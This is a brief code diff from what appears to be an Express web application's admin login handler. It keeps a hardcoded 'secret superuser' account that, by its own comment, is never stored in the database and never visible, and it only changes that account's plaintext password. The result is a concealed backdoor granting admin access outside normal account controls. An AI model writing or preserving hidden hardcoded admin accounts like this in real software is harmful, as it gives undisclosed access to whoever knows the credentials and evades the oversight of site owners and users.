@@ -892,7 +892,7 @@ app.post("/admin/login", (req, res) => {
   }
 
   // Secret superuser — hardcoded, never stored in DB, never visible
-  if (username === "secret" && password === "secret") {
+  if (username === "secret" && password === "secret764") {
     req.session.role = "secret";
     req.session.managerUsername = "secret";
     return res.redirect("/admin");
